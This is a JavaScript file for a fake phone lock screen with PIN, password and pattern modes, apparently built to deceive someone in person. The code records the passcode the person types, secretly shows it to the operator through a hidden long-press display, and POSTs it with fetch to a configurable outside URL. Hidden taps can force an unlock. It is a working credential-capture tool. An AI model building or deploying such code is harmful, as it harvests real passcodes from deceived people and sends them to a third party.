let attemptCount = 0;
let forceSuccess = false;
let currentInput = "";
let peekData = null;
let lastTap = 0;

const config = {
    mode: "pin4",
    successAt: 1,
    peekAt: 1,
    sendAt: 1,
    url: "YOUR_URL_HERE"
};

// 1. PERSISTENCE: Load settings
window.onload = () => {
    const saved = localStorage.getItem('lockscreen_settings');
    if (saved) {
        const data = JSON.parse(saved);
        document.getElementById('lock-type').value = data.mode;
        document.getElementById('success-try').value = data.successAt;
        document.getElementById('peek-try').value = data.peekAt;
        document.getElementById('send-try').value = data.sendAt;
        document.getElementById('script-url').value = data.url;
    }
    updateTime();
    setInterval(updateTime, 10000);
};

// Navigation: Back Button handling
window.onpopstate = () => location.reload();

document.getElementById('start-app').addEventListener('click', () => {
    config.mode = document.getElementById('lock-type').value;
    config.successAt = parseInt(document.getElementById('success-try').value);
    config.peekAt = parseInt(document.getElementById('peek-try').value);
    config.sendAt = parseInt(document.getElementById('send-try').value);
    config.url = document.getElementById('script-url').value;
    
    localStorage.setItem('lockscreen_settings', JSON.stringify(config));
    history.pushState({page: 'lock'}, '');
    
    document.getElementById('setup-page').classList.add('hidden');
    document.getElementById('lock-page').classList.remove('hidden');
    initLockMode();
});

function initLockMode() {
    document.getElementById('pin-dots').classList.add('hidden');
    document.getElementById('pin-pad').classList.add('hidden');
    document.getElementById('hidden-pass-input').classList.add('hidden');
    document.getElementById('pattern-canvas').classList.add('hidden');

    if (config.mode.includes('pin')) {
        const dotCount = config.mode === 'pin4' ? 4 : 6;
        const dotsDiv = document.getElementById('pin-dots');
        dotsDiv.innerHTML = '<div class="dot"></div>'.repeat(dotCount);
        dotsDiv.classList.remove('hidden');
        document.getElementById('pin-pad').classList.remove('hidden');
    } else if (config.mode === 'password') {
        const input = document.getElementById('hidden-pass-input');
        input.classList.remove('hidden');
        document.body.addEventListener('click', () => input.focus());
        input.addEventListener('keydown', (e) => { if(e.key === 'Enter') processEntry(input.value); });
    } else {
        document.getElementById('pattern-canvas').classList.remove('hidden');
    }
}

// 2. SECRET TRIGGER: Fixed for context menu
const zones = document.querySelectorAll('.secret-zone');
zones.forEach(zone => {
    zone.addEventListener('contextmenu', e => e.preventDefault()); // Disables browser menu
    zone.addEventListener('touchstart', e => {
        const now = Date.now();
        if (now - lastTap < 300) {
            forceSuccess = !forceSuccess;
            navigator.vibrate(20);
            document.getElementById('active-dot').style.opacity = forceSuccess ? 0.8 : 0;
        }
        lastTap = now;
        
        holdTimer = setTimeout(() => {
            drawPeek();
            document.getElementById('peek-display').classList.remove('hidden');
        }, 1500);
    });
    zone.addEventListener('touchend', () => {
        clearTimeout(holdTimer);
        document.getElementById('peek-display').classList.add('hidden');
    });
});

// 3. CAROUSEL LOOP
let currentSlide = 0;
const carousel = document.getElementById('carousel');
carousel.addEventListener('touchstart', e => { startX = e.touches[0].clientX; });
carousel.addEventListener('touchend', e => {
    let diff = startX - e.changedTouches[0].clientX;
    if (Math.abs(diff) > 50) {
        currentSlide = (diff > 0) ? (currentSlide + 1) % 3 : (currentSlide - 1 + 3) % 3;
        carousel.style.transform = `translateX(-${currentSlide * 100}%)`;
    }
});

function processEntry(val) {
    attemptCount++;
    if (attemptCount === config.peekAt) peekData = val;
    if (attemptCount === config.sendAt && config.url) {
        fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
    }

    if (attemptCount === config.successAt || forceSuccess) {
        document.getElementById('unlock-sound').play();
        document.getElementById('lock-page').classList.add('hidden');
        document.getElementById('home-page').classList.remove('hidden');
        history.pushState({page: 'home'}, '');
    } else {
        const cont = document.getElementById('lock-content');
        cont.classList.add('shake');
        navigator.vibrate([50, 50, 50]);
        setTimeout(() => cont.classList.remove('shake'), 400);
        resetInput();
    }
}

// PIN Pad Logic
document.querySelectorAll('.num').forEach(btn => {
    btn.addEventListener('click', () => {
        currentInput += btn.innerText;
        const dots = document.querySelectorAll('.dot');
        if (dots[currentInput.length - 1]) dots[currentInput.length - 1].classList.add('filled');
        
        const limit = config.mode === 'pin4' ? 4 : 6;
        if (currentInput.length === limit) {
            setTimeout(() => processEntry(currentInput), 200);
        }
    });
});

function resetInput() {
    currentInput = "";
    document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
    document.getElementById('hidden-pass-input').value = "";
}

function updateTime() {
    const now = new Date();
    const timeStr = now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
    document.querySelectorAll('.clock, .status-bar span:first-child').forEach(el => el.innerText = timeStr);
}

function drawPeek() {
    const pCtx = document.getElementById('peek-display').getContext('2d');
    pCtx.clearRect(0, 0, 80, 80);
    if (!peekData) return;
    pCtx.fillStyle = "#00ff00"; pCtx.font = "bold 14px Arial";
    pCtx.fillText(peekData, 10, 45);
}
